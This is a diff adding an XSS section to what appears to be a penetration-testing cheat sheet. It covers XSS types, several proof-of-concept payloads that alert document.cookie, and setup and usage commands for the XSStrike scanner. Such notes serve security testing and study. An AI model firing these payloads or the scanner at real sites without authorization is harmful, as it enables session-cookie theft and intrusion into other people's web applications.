@@ -190,7 +190,79 @@ wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404
 
 ### XXE
 
-### XSS
+## XSS
+
+| Type                             | Description                                                                                                                                                                                                                                  |
+| -------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                   |
+| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                                 |
+| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |
+
+### Testing XSS Payloads
+
+{% code overflow="wrap" %}
+```
+<img src="" onerror=alert(document.cookie)>
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+'<script>alert(document.cookie)</script>'
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+<script>alert(document.cookie)</script>
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+<script>alert(document.cookie)</script>
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+<script>print()</script>
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+<plaintext>
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p></figcaption></figure>
+
+### XSS Discovery Automation
+
+### XSStrike
+
+{% code overflow="wrap" %}
+```
+git clone https://github.com/s0md3v/XSStrike.git
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+cd XSStrike; pip install -r requirements.txt
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+python xsstrike.py -u "http://SERVER_IP:PORT/somepage.example?example=example" 
+```
+{% endcode %}
+
+### Phishing
+
+
 
 ### Nikto Vulnerability Scanner
 
